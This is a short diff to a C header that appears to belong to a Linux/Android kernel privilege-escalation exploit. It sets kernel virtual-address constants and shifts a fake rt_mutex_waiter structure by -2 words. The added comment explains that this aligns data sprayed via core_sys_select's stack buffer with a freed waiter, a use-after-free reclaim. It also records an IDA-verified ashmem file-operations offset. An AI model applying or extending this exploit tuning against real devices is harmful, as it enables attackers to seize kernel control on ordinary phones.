@@ -26,7 +26,13 @@
 #define DIRECT_MAP_END 0xffffffc000000000ULL               /* 39-bit VA: 16GB direct map */
 #define VMEMMAP_START 0xfffffffe00000000ULL                /* 39-bit VA vmemmap */
 
-#define PSELECT_WAITER_WORD_SHIFT 0
+/* -2: aligns the fake waiter (table starts at word 2 = stack_fds+0x10) with the
+ * freed rt_mutex_waiter, which QEMU/disasm frame-summing places at the SAME
+ * kernel-stack address as core_sys_select's stack_fds (both SP_DIV-0x210). So
+ * the waiter base must be stack_fds+0 -> shift word 2 down to long 0 = -2.
+ * See RTMUTEX_WALK_DISASM_ANALYSIS.md "Reclaim alignment". Floor is -2 (word 0
+ * = tree_pc must stay >= 0). */
+#define PSELECT_WAITER_WORD_SHIFT -2
 
 /* 符号偏移 (IDA MCP verified from miscdevice + fops structure) */
 #define ASHMEM_MISC_FOPS_OFF 0x0229d120ULL   /* ✓ IDA: miscdevice @ 0x291A8D8 fops_ptr = 0xffffffc00a2c0048 */
